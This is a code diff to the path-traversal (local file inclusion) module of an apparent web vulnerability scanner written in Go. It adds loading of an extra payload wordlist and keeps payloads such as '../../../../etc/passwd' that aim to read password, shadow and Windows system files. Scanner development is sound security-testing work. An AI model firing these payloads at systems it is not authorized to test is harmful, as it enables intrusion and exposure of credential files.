@@ -3,8 +3,10 @@ package modules
 import (
 	"encoding/base64"
 	"nightfalllx/pkg/client"
+	"nightfalllx/pkg/wordlists"
 	"regexp"
 	"strings"
+	"sync"
 )
 
 type LFIModule struct{}
@@ -29,6 +31,49 @@ var (
 	base64BlobRegex  = regexp.MustCompile(`(?:[A-Za-z0-9+/]{4}){4,}(?:[A-Za-z0-9+/]{2}==|[A-Za-z0-9+/]{3}=)?`)
 )
 
+type traversalEntry struct {
+	Payload string
+	Regex   *regexp.Regexp
+}
+
+var (
+	lfiOnce              sync.Once
+	allTraversalPayloads []traversalEntry
+)
+
+func getTraversalPayloads() []traversalEntry {
+	lfiOnce.Do(func() {
+		allTraversalPayloads = append([]traversalEntry{}, traversalPayloads...)
+		seen := make(map[string]bool)
+		for _, p := range traversalPayloads {
+			seen[p.Payload] = true
+		}
+
+		for _, p := range wordlists.LoadLFI() {
+			p = strings.TrimSpace(p)
+			if p == "" || seen[p] {
+				continue
+			}
+			lower := strings.ToLower(p)
+			var rx *regexp.Regexp
+			if strings.Contains(lower, "passwd") || strings.Contains(lower, "shadow") {
+				rx = rootPasswdRegex
+			} else if strings.Contains(lower, "win.ini") || strings.Contains(lower, "boot.ini") {
+				rx = winIniRegex
+			} else if strings.Contains(lower, "hosts") {
+				rx = winHostsRegex
+			} else if strings.Contains(lower, "version") {
+				rx = procVersionRegex
+			}
+			if rx != nil {
+				seen[p] = true
+				allTraversalPayloads = append(allTraversalPayloads, traversalEntry{Payload: p, Regex: rx})
+			}
+		}
+	})
+	return allTraversalPayloads
+}
+
 /*
 CATEGORY: LFI & Path Traversal Vectors (60+ entries)
 Sources: OWASP Web Security Testing Guide (WSTG-INPV-12), HackTricks LFI Cheat Sheet.
@@ -42,10 +87,7 @@ Contexts:
 - Windows win.ini & hosts file traversals (forward and backslashes)
 - Linux /proc virtual filesystem inspection
 */
-var traversalPayloads = []struct {
-	Payload string
-	Regex   *regexp.Regexp
-}{
+var traversalPayloads = []traversalEntry{
 	// 1. Standard Unix /etc/passwd (depth 4 to 12)
 	{"../../../../etc/passwd", rootPasswdRegex},
 	{"../../../../../etc/passwd", rootPasswdRegex},
@@ -179,7 +221,7 @@ func (m *LFIModule) Run(target *Target, c *client.Client) ([]*Finding, error) {
 		}
 
 		// 2. Traversal path checks
-		for _, tPayload := range traversalPayloads {
+		for _, tPayload := range getTraversalPayloads() {
 			var resp *client.Response
 			var err error
 
